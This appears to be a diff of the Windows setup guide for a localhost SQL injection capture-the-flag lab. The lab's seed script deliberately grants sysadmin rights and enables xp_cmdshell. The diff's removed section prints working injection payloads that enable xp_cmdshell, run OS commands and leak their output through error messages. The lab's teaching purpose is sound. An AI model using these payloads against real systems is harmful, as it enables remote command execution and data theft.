@@ -1,14 +1,15 @@
-# Windows setup — real `xp_cmdshell` RCE
+# Windows setup — database on Windows (enables the full RCE chain)
 
-`xp_cmdshell` is **not supported on SQL Server on Linux** (platform limitation, all editions).
-The Docker/Linux lab therefore cannot run the classic RCE step. To reproduce the finding exactly —
-enable `xp_cmdshell` through the injection and run OS commands — run the **database on Windows**.
+`xp_cmdshell` is **not supported on SQL Server on Linux**, so the all-Docker lab (`docker-compose.yml`)
+can't run the final command-execution step. To reproduce the write-up end to end — enable
+`xp_cmdshell` through the injection and run OS commands — run the **database on Windows**.
 
 There is no official Windows *container* image for SQL Server 2019/2022, so "DB on Windows" means
 installing **SQL Server Developer Edition** (free) on your Windows host. The web app still runs in
 Docker and connects to the host database.
 
-> ⚠️ Same safety rules: localhost only, fictional data, authorized learning.
+> This is the detailed version of **Path A** in the [README](../README.md). Same safety rules:
+> localhost only, fictional data, authorized learning.
 
 ---
 
@@ -28,8 +29,7 @@ Docker and connects to the host database.
    "SQL Server and Windows Authentication mode" → OK → restart the service.
 3. Allow inbound TCP **1433** through Windows Firewall (so the Docker container can reach the host).
 
-## 3. Seed the database (creates StoreDb, VaultDb, the `webapp` sysadmin login,
-enables `xp_cmdshell`, and writes the flag)
+## 3. Seed the database
 
 From the repo folder, using `sqlcmd` (Windows auth `-E`, or `-U sa -P <sa-pw>`):
 
@@ -41,7 +41,7 @@ Use the same `WEBAPP_PASSWORD` value that's in your `.env`. The script:
 - creates `StoreDb` (~55 products) and `VaultDb` (with the decoy `Flag` table),
 - creates login `webapp` and adds it to **sysadmin**,
 - **enables `xp_cmdshell`** (works on Windows), and
-- writes the real flag `Flag.txt` into SQL Server's working directory via `xp_cmdshell`.
+- writes the real flag to **`C:\Users\Public\Flag.txt`** via `xp_cmdshell`.
 
 ## 4. Start the web app (Docker) pointed at the host DB
 
@@ -58,58 +58,20 @@ Browse to **http://localhost:8080**. If the web container can't connect, re-chec
 
 ---
 
-## 5. RCE — now it works
+## Now exploit it
 
-The injection point is still `GET /search?price=`. On Windows, `xp_cmdshell` is available, so the
-enable-and-run chain from your write-up works verbatim. Note Windows commands: `whoami`, `dir`
-(not `ls`), `type` (not `cat`).
+With the database on Windows, the full chain works — including `xp_cmdshell` and the real flag at
+`C:\Users\Public\Flag.txt`. The complete, step-by-step exploitation (identical to the write-up) is in:
 
-**Confirm you're a DBA and enable xp_cmdshell (if not already):**
+- [`../steps.md`](../steps.md) — English
+- [`../steps-hebrew.md`](../steps-hebrew.md) — עברית
 
-```
-?price='; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
-```
-
-(HTTP 200, no error — unlike on Linux.)
-
-**Run a command + capture output:**
-
-```
-?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'whoami';--
-```
-
-**Exfiltrate via the error channel:**
-
-```
-?price=' OR 1=CONVERT(int,(SELECT TOP 1 line FROM dbo.rce_out WHERE line IS NOT NULL ORDER BY id))--
-```
-
-→ 500 leaks e.g. `nt authority\system` (or the SQL service account). **This is code execution.**
-
-**Find and read the flag** (`dir` then `type Flag.txt`):
-
-```
-?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'dir /b';--
-?price=' OR 1=CONVERT(int,(SELECT STRING_AGG(line,',') FROM dbo.rce_out WHERE line IS NOT NULL))--
-```
-
-then:
-
-```
-?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'type Flag.txt';--
-?price=' OR 1=CONVERT(int,(SELECT TOP 1 line FROM dbo.rce_out WHERE line IS NOT NULL ORDER BY id))--
-```
-
-→ 500 leaks: `This Is The KfirVerse flag - Congrats :)`
-
-The `Flag.txt` sits in SQL Server's working directory (the `...\MSSQL\Binn` folder). If `dir /b`
-shows it elsewhere, adjust the `type` path accordingly.
+Windows command notes: use `whoami`, `dir` (not `ls`), `type` (not `cat`).
 
 ---
 
 ## Notes
 
-- The Linux/Docker lab (`docker-compose.yml`) is still fine for everything **except** the RCE step;
-  there the flag is reachable via `OPENROWSET(BULK …)` file-read instead. This Windows path is the
-  one that reproduces `xp_cmdshell` exactly.
-- The decoy `VaultDb.dbo.Flag` (SQLi) still taunts; the real flag still requires command execution.
+- The all-Docker lab (`docker-compose.yml`) is fine for the SQL injection and database enumeration,
+  but **not** the `xp_cmdshell` RCE step or the real on-disk flag — those need this Windows setup.
+- The decoy `VaultDb.dbo.Flag` (reachable by SQLi) only taunts; the real flag requires command execution.
